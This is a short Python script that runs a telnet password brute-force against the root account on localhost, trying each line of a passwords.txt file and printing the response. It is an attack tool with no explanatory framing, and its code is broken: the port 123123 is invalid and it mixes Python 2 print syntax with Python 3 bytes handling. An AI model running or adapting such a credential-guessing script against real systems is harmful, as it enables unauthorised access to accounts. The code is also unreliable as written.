import telnetlib
import time


def main(password):
	host = '127.0.0.1'
	username = 'root'
	tn = telnetlib.Telnet(host, port=123123)
	tn.read_until(b'Login as:', timeout=1)
	tn.write(username.encode('ascii') + b"\n")
	tn.read_until(b'Password:', timeout=1)
	tn.write(password.encode('ascii') + b"\n")
	time.sleep(1)
	res = tn.read_very_eager().decode('ascii')
	print 'try pass: '+password,res

if __name__ == '__main__':
	passwords = open('passwords.txt', 'r').readlines()
	for i in passwords:
		password = i.strip()
		main(password)
